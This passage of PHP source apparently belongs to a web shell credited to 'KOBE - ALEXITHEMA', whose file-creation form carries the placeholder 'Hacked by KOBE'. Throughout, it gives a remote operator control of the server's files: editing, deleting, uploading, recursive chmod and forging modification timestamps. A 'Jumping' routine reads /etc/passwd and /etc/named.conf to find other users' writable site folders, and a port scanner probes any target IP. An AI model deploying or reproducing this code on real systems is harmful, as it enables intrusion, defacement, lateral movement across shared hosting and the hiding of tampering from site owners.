                echo "<strong>Edit file OK using fallback! " . ok() . "</strong></div>";
            } else {
                echo "<strong>Edit file FAIL! " . er() . "</strong></div>";
            }
        } else {
            echo "<strong>Edit file OK using file_put_contents! " . ok() . "</strong></div>";
        }
    }
}
if ($_1337["action"] == "edit") {
    s();
    echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delfile&opn=$file'><i class='bi bi-trash-fill'></i></a>
</div><br><i class='bi bi-file-earmark'></i>:&nbsp;" .basename($file) ."</br>
		<form method='POST'>
			<textarea class='form-control btn-sm' rows='10' name='contents' $_r>" .htmlspecialchars(file_get_contents($file)) ."</textarea>
			<div class='d-grid gap-2'><br>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='edit_file'><i class='bi bi-emoji-smile-upside-down'></i></button>
			</div>
		</form>";
}

//rename folder
if ($_1337["action"] == "rename_folder") {
    if ($_1337["r_d"]) {
        $r_d = rename(
            $dir,
            "" . dirname($dir) . "/" . htmlspecialchars($_1337["r_d"]) . ""
        );
        if ($r_d) {
            echo "<strong>Rename folder OK! ".ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></strong></div>';
        } else {
            echo "<strong>Rename folder FAIL! ".er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></strong></div>';
        }
    }
    s();
    echo "
		<div class='btn-group'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate_folder'><i class='bi bi-calendar-date'></i></a>
<!--<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod'><i class='bi bi-file-earmark-medical'></i></a>-->
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
		</div>
		<br>
			<i class='bi bi-folder-fill'></i>:&nbsp;". basename($dir) ."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' value='". basename($dir) ."' name='r_d' $_r>
				<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-emoji-smile-upside-down'></i></button>
			</div>
		</form>";
}
//rename file
if (isset($_1337["r_f"])) {
    $old = $file;
    $new = $_1337["new_name"];
    rename($new, $old);
    if (file_exists($new)) {
        echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert">
			<strong>Rename file name already in use! <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
		</div>';
    } else {
        if (rename($old, $new)) {
            echo "<strong>Rename file OK! " . ok() . "</strong></div>";
        } else {
            echo "<strong>Rename file FAIL! " . er() . "</strong></div>";
        }
    }
}
if ($_1337["action"] == "rename") {
    s();
    echo "
		<div class='btn-group'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delfile&opn=$file'><i class='bi bi-trash-fill'></i></a>

		</div>
		<br>
			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
		</br>
		<form method='POST'>
			<div class='input-group'>
				<input class='form-control btn-sm' type='text' name='new_name' value='".basename($file)."' $_r>
				<button class='btn btn-outline-light btn-sm' type='sumbit' name='r_f'><i class='bi bi-emoji-smile-upside-down'></i></button>
			</div>
		</form>";
}
// chemod
if ($_1337["action"] == "chemod") {
    s();

    function chmodItem($itemPath, $newPermission)
    {
        if (is_file($itemPath)){
            if (chmod($itemPath, octdec($newPermission))) {
                return true;
            } else {
                return false;
            }
        }
        return false;
    }

    function chmodDirectory($dirPath, $newPermission)
    {
        $items = scandir($dirPath);
        foreach ($items as $item) {
            if ($item != "." && $item != "..") {
                $itemPath = $dirPath . "/" . $item;
                if (is_dir($itemPath)) {
                    chmodDirectory($itemPath, $newPermission);
                }
                chmodItem($itemPath, $newPermission);
            }
        }
    }

    $itemToChmod = $_GET["opn"];
    $itemPathToChmod = $path . "/" . $itemToChmod;

    echo "<div class='btn-group'>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate&opn=$file'><i class='bi bi-calendar-date'></i></a>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
    <a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delfile&opn=$file'><i class='bi bi-trash-fill'></i></a>
    </div>
    <br><i class='bi " . (is_dir($itemPathToChmod) ? "bi-folder" : "bi-file-earmark") . "'></i>:&nbsp;" . basename($itemPathToChmod) . "</br>
    <form method='POST'><div class='input-group'><input class='form-control btn-sm' type='text' name='new_permission' placeholder='0777' $_r>
    <button class='btn btn-outline-light btn-sm' type='submit' name='chemodkan'><i class='bi bi-emoji-smile-upside-down'></i></button>
    </div>
    </form>";

    // Check if the form is submitted
    if (isset($_POST["chemodkan"])) {
        $newPermission = $_POST["new_permission"];
        if (is_dir($itemPathToChmod)) {
            chmodDirectory($itemPathToChmod, $newPermission);
        } else {
            chmodItem($itemPathToChmod, $newPermission);
        }

        echo "<strong>Change Permission OK! " . ok() . "</strong></div>";
    }
}


// jumping
if ($_1337["id"] == "jumping") {
    s();
    $i = 0;
    echo "<center class='anu'>Jumping</center>
    <div class='card card-body text-dark input-group mb-3'>";
    echo "<pre>";
    ($etc = fopen("/etc/passwd", "r")) or
        die("<font color=red>Can't read /etc/passwd</font>");
    while ($passwd = fgets($etc)) {
        if ($passwd == "" || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all("/(.*?):x:/", $passwd, $jumpss);
            foreach ($jumpss[1] as $uservaljump) {
                $valuserjumpindir = "/home/$uservaljump/public_html";
                if (is_readable($valuserjumpindir)) {
                    $i++;
                    $jrw = "[<i class='bi bi-file-earmark'></i> | R] <a href='?path=$valuserjumpindir'>$valuserjumpindir</a>";
                    if (is_writable($valuserjumpindir)) {
                        $jrw = "[<i class='bi bi-file-earmark-fill'></i> | RW] <a href='?path=$valuserjumpindir'>$valuserjumpindir</a>";
                    }
                    echo $jrw;
                    if (function_exists("posix_getpwuid")) {
                        $domain_jump = file_get_contents("/etc/named.conf");
                        if ($domain_jump == "") {
                            echo " -> [<font color=red>Cannot get domain name</font>]";
                        } else {
                            preg_match_all(
                                "#/var/named/(.*?).db#",
                                $domain_jump,
                                $domjump
                            );
                            foreach ($domjump[1] as $dj) {
                                $valuserjump = posix_getpwuid(
                                    @fileowner("/etc/valiases/$dj")
                                );
                                $valuserjump = $valuserjump["name"];
                                if ($valuserjump == $uservaljump) {
                                    echo " -> [<u>$dj</u>]<br>";
                                    break;
                                }
                            }
                        }
                    } else {
                        echo "<br>";
                    }
                }
            }
        }
    }
    if ($i == 0) {
    } else {
        echo "<br>Total " .$i ." Can jumping on this server " .gethostbyname($_SERVER["HTTP_HOST"]) ."!";}
    echo "</pre>
    </div>";

}
// port scanner
if ($_1337["id"] == "portscan") {
    s();
    echo '<center class="anu">Port Scanner</center>';
    echo "
    <div class='card card-body text-dark input-group mb-3'>
    <form method='post'>
        <div class='form-group'>
            <i class='bi bi-hdd-network'></i> Target IP:
            <input type='text' class='form-control btn-sm text-dark' name='target' placeholder='".$_SERVER['HTTP_HOST']."' $_r>
        </div>
        <div class='form-group'>
            <i class='bi bi-hdd'></i> Start Port:
            <input type='number' class='form-control btn-sm text-dark' name='startPort' placeholder='21' $_r>
        </div>
        <div class='form-group'>
            <i class='bi bi-hdd'></i> End Port:
            <input type='number' class='form-control btn-sm text-dark' name='endPort' placeholder='10000' $_r>
        </div>
        <div class='d-grid gap-2'>
        <input class='btn btn-dark btn-sm' type='submit' name='scan' value='Submit!'>
        </div>
    </form>
</div>";
if (isset($_POST['scan'])) {
    $target = isset($_POST['target']) ? $_POST['target'] : 'localhost';
    $startPort = $_POST['startPort'];
    $endPort = $_POST['endPort'];

    echo "<div class='card card-body text-dark'><ul>";
for ($port = $startPort; $port <= $endPort; $port++) {
    $connection = @fsockopen($target, $port, $errno, $errstr, 1);

    echo "<li>";
    echo "Port $port: ";
    if ($connection) {
        echo "<gr>Open</gr>";
        fclose($connection);
    } else {
        echo "<rd>Close</rd>";
    }
    echo "</li>";
}
echo "</ul></div>";

}
    
}

// change date modified folder
if ($_1337["action"] == "chdate_folder") {
    s();
    function changeDate($itemPath, $newDate)
    {
        if (is_file($itemPath) || is_dir($itemPath)) {
            if (touch($itemPath, strtotime($newDate))) {
                return true;
            } else {
                return false;
            }
        }
        return false;
    }
    $currentTime = microtime(true);
    $microseconds = sprintf("%06d", ($currentTime - floor($currentTime)) * 1000000);
    $dateTimeWithMicroseconds = date("Y-m-d H:i:s.", $currentTime) . $microseconds;
    $itemToChangeDate = $_GET["opn"];
    $itemPathToChangeDate = $path . "/" . $itemToChangeDate;
    echo "<div class='btn-group'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate_folder'><i class='bi bi-calendar-date'></i></a>
<!--<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod'><i class='bi bi-file-earmark-medical'></i></a>-->
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
</div>
<br><i class='bi " . (is_dir($itemPathToChangeDate) ? "bi-folder" : "bi-file-earmark") . "'></i>:&nbsp;" . basename($itemPathToChangeDate) . "</br>
<form method='POST'><div class='input-group'><input class='form-control btn-sm' type='text' name='new_date' value='".$dateTimeWithMicroseconds."' $_r>
<button class='btn btn-outline-light btn-sm' type='sumbit' name='chdate_folder'><i class='bi bi-emoji-smile-upside-down'></i></button>
</div>
</form>";

    if (isset($_POST["chdate_folder"])) {
        $newDate = $_POST["new_date"];
        if (changeDate($itemPathToChangeDate, $newDate)) {
            echo "<strong>Change Date OK! " . ok() . "</strong></div>";
        } else {
            echo "<strong>Change Date FAIL! " . er() . "</strong></div>";
        }
    }
}
// change date modified
if ($_1337["action"] == "chdate") {
    s();
    function changeDate($itemPath, $newDate)
    {
        if (is_file($itemPath) || is_dir($itemPath)) {
            if (touch($itemPath, strtotime($newDate))) {
                return true;
            } else {
                return false;
            }
        }
        return false;
    }
    $currentTime = microtime(true);
    $microseconds = sprintf("%06d", ($currentTime - floor($currentTime)) * 1000000);
    $dateTimeWithMicroseconds = date("Y-m-d H:i:s.", $currentTime) . $microseconds;
    $itemToChangeDate = $_GET["opn"];
    $itemPathToChangeDate = $path . "/" . $itemToChangeDate;
    echo "<div class='btn-group'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delfile&opn=$file'><i class='bi bi-trash-fill'></i></a></div>
<br><i class='bi " . (is_dir($itemPathToChangeDate) ? "bi-folder" : "bi-file-earmark") . "'></i>:&nbsp;" . basename($itemPathToChangeDate) . "</br>
<form method='POST'><div class='input-group'><input class='form-control btn-sm' type='text' name='new_date' value='".$dateTimeWithMicroseconds."' $_r>
<button class='btn btn-outline-light btn-sm' type='sumbit' name='chdate'><i class='bi bi-emoji-smile-upside-down'></i></button>
</div>
</form>";

    if (isset($_POST["chdate"])) {
        $newDate = $_POST["new_date"];
        if (changeDate($itemPathToChangeDate, $newDate)) {
            echo "<strong>Change Date OK! " . ok() . "</strong></div>";
        } else {
            echo "<strong>Change Date FAIL! " . er() . "</strong></div>";
        }
    }
}
//delete file
if ($_1337["action"] == "delfile") {
    s();
    if ($_1337["yeahx"]) {
        $delete = unlink($file);
        if ($delete) {
            echo "<strong>Delete file OK! " . ok() . "</strong></div>";
        } else {
            echo "<strong>Delete file FAIL! " . er() . "</strong></div>";
        }
    }
    echo "
		<div class='btn-group mb-3'>
			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delfile&opn=$file'><i class='bi bi-trash-fill'></i></a>
		</div>
		<div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : ".basename($file)." ?</p>
			<form method='POST'>
				<a class='btn btn-dark btn-block btn-sm' href='?dir=$dir'>No</a>
				<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
}
//delete folder
if ($_1337["action"] == "delete_folder") {
    s();
    if ($_1337["yeah"]) {
    if (is_dir($dir)) {
        if (is_writable($dir)) {
            if (deleteDir($dir)) {
                echo "<strong>Delete folder OK! " . ok() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></strong></div>';
            } else {
                echo "<strong>Delete folder FAIL! " . er() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></strong></div>';
            }
        } else {
            echo "<strong>Delete folder FAIL! " . er() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></strong></div>';
        }
    }
}
    echo "<div class='btn-group mb-3'>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate_folder'><i class='bi bi-calendar-date'></i></a>
<!--<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod'><i class='bi bi-file-earmark-medical'></i></a>-->
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
</div><div class='card card-body text-dark input-group mb-3'>
			<p>Are you sure to delete : ". basename($dir) ." ?</p>
			<form method='POST'>
				<a class='btn btn-dark btn-block btn-sm' href='?dir=".dirname($dir)."'>No</a>
				<input type='submit' name='yeah' class='btn btn-success btn-block btn-sm' value='Yes'>
			</form>
		</div>";
}
if (isset($_1337["filenew"])) {
    s();
    if (isset($_1337["bikin"])) {
    $name = $_1337["name_file"];
    $contents_file = $_1337["contents_file"];
    $files = $_FILES["file_upload"];
    $path = isset($_1337['path']) ? $_1337['path'] : '';

    foreach ($name as $index => $name_file) {
        $handle = @fopen($name_file, "w");
        $create = false;

        if ($contents_file && strlen($contents_file) > 0) {
            $create = @fwrite($handle, $contents_file);
        } else {
            if (isset($files['tmp_name'][$index]) && $files['size'][$index] > 0) {
                // Metode move_uploaded_file
                $create = move_uploaded_file($files['tmp_name'][$index], $name_file);
            } else {
                // Metode file_get_contents dan file_put_contents
                $file_contents = file_get_contents($files['tmp_name'][$index]);
                $create = file_put_contents($name_file, $file_contents);

                if (!$create) {
                    // Metode copy
                    $create = copy($files['tmp_name'][$index], $name_file);
                }
            }
        }

        fclose($handle);
    }
        if ($create) {
            #echo "<script>window.location='?path=$path'</script>";
            echo "<strong>Create file OK! " . ok() . "</strong></div>";
        } else {
            echo "<strong>Create file FAIL! " . er() . "</strong></div>";
        }
    }
    echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control form-control-sm text-dark' type='text' name='name_file[]' placeholder='KOBE.txt' $_r>
				<i class='bi bi-code-square'></i> Your Script:
				<textarea class='form-control form-control-sm text-dark' name='contents_file' rows='7' placeholder='Hacked by KOBE' $_r></textarea>
				<div class='d-grid gap-2'><br>
					<input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='Submit!'>
				</div>
			</form>
		</div>";
}
if (isset($_1337["dirnew"])) {
    s();
    if (isset($_1337["create"])) {
        $name = $_1337["name_dir"];
        foreach ($name as $name_dir) {
            $folder = preg_replace(
                "([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})",
                "",
                $name_dir
            );
            $fd = @mkdir($folder);
        }
        if ($fd) {
            echo "<script>window.location='?path=$path'</script>";
        } else {
            echo "<strong>Create dir FAIL! " . er() . "</div>";
        }
    }
    echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Directory name:
				<div class='input-group mb-3'>
					<input class='form-control form-control-sm text-dark' type='text' name='name_dir[]' placeholder='New Folder' $_r>
					<input class='btn btn-outline-light btn-sm' type='submit' name='create' value='Create Directory!'>
				</div>
			</form>
		</div>";
}
echo '
		<div class="table-responsive">
		<table class="table table-hover table-dark text-light">
		<thead>
		<tr>
			<td class="text-center">NAME</td>
				<td class="text-center">TYPE</td>
				<td class="text-center">LAST MODIFIED</td>
				<td class="text-center">SIZE</td>
				<td class="text-center">OWNER <font class="text-danger">/</font> GROUP</td>
				<td class="text-center">PERMISSIONS</td>
			<td class="text-center">ACTION</td>
		</tr>
		</thead>
		<tbody class="text-nowrap">
		<tr>
			<td><i class="bi bi-folder2-open"></i> <a class="text-decoration-none text-white" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td></td><td class="text-center">
				<div class="btn-group">
					<a class="btn btn-outline-light btn-sm" href="?filenew&path='.$dir.'"><i class="bi bi-file-earmark-plus"></i></a>
					<a class="btn btn-outline-light btn-sm" href="?dirnew&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
				</div>
			</td>
		</tr>';
foreach ($scand as $dir) {
    $dt = date("Y-m-d G:i", filemtime("$path/$dir"));
    if (strlen($dir) > 25) {
        $_d = substr($dir, 0, 25) . "...";
    } else {
        $_d = $dir;
    }
    if (function_exists("posix_getpwuid")) {
        $downer = @posix_getpwuid(fileowner("$path/$dir"));
        $downer = $downer["name"];
    } else {
        $downer = fileowner("$path/$dir");
    }
    if (function_exists("posix_getgrgid")) {
        $dgrp = @posix_getgrgid(filegroup("$path/$dir"));
        $dgrp = $dgrp["name"];
    } else {
        $dgrp = filegroup("$path/$dir");
    }
    if (!is_dir($path . "/" . $file)) {
        continue;
    }
    $size = filesize($path . "/" . $file) / 1024;
    $size = round($size, 3);
    if ($size >= 1024) {
        $size = round($size / 1024, 2) . " MB";
    } else {
        $size = $size . " KB";
    }
    if (!is_dir($path . "/" . $dir) || $dir == "." || $dir == "..") {
        continue;
    }
    echo "
    <tr>
        <td><i class='bi bi-folder-fill'></i> <a class='text-decoration-none text-white' href='?dir=$path/$dir'>$_d</a></td>
        <td class='text-center text-white'>d!r</td>
        <td class='text-center text-white'>$dt</td>
        <td class='text-center text-white'>-</td>
        <td class='text-center text-white'>$downer<font class='text-danger'> / </font>$dgrp</td>
        <td class='text-center'>";

    if (is_writable($path . "/" . $dir)) {
        echo "<gr>";
    } elseif (!is_readable($path . "/" . $dir)) {
        echo "<rd>";
    }
    echo p($path . "/" . $dir);
    if (is_writable($path . "/" . $dir) || !is_readable($path . "/" . $dir)) {
        echo "</font></center></td>";
    }
    echo "
			<td class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path/$dir&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path/$dir&action=chdate_folder'><i class='bi bi-calendar-date'></i></a>
                <!--<a class='btn btn-outline-light btn-sm' href='?dir=$path/$dir&action=chemod'><i class='bi bi-file-earmark-medical'></i></a>-->
				<a class='btn btn-outline-danger btn-sm txt' href='?dir=$path/$dir&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
			</div>
			</td>
		</tr>";
}
foreach ($scand as $file) {
    $ft = date("Y-m-d G:i", filemtime("$path/$file"));
    if (function_exists("posix_getpwuid")) {
        $fowner = @posix_getpwuid(fileowner("$path/$file"));
        $fowner = $fowner["name"];
    } else {
        $fowner = fileowner("$path/$file");
    }
    if (function_exists("posix_getgrgid")) {
        $fgrp = @posix_getgrgid(filegroup("$path/$file"));
        $fgrp = $fgrp["name"];
    } else {
        $fgrp = filegroup("$path/$file");
    }
    if (!is_file($path . "/" . $file)) {
        continue;
    }
    if (strlen($file) > 25) {
        $_f = substr($file, 0, 25) . "...-." . $ext;
    } else {
        $_f = $file;
    }
    echo "
    <tr>
        <td><i class='bi bi-file-earmark-text-fill'></i> <a class='text-decoration-none text-white' href='?dir=$path&action=view&opn=$file' class='text-white'>$_f</a></td>
        <td class='text-center text-white'>f!le</td>
        <td class='text-center text-white'>$ft</td>
        <td class='text-center text-white'>".sz(filesize($file))."</td>
        <td class='text-center text-white'>$fowner<font class='text-danger'> / </font>$fgrp</td>
        <td class='text-center'>";
    if (is_writable($path . "/" . $file)) {
        echo "<gr>";
    } elseif (!is_readable($path . "/" . $file)) {
        echo "<rd>";
    }
    echo p($path . "/" . $file);
    if (is_writable($path . "/" . $file) || !is_readable($path . "/" . $file)) {
        echo "</gr></rd></td>";
    }
    echo "<td class='text-center'>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chdate&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delfile&opn=$file'><i class='bi bi-trash-fill'></i></a>
			</div>
			</td>
		</tr>";
}
echo "</tbody></table></div><center><div class='text-white'><hr><font color='white'>&copy; KOBE - ALEXITHEMA</font></div></center></body></html>";
?>
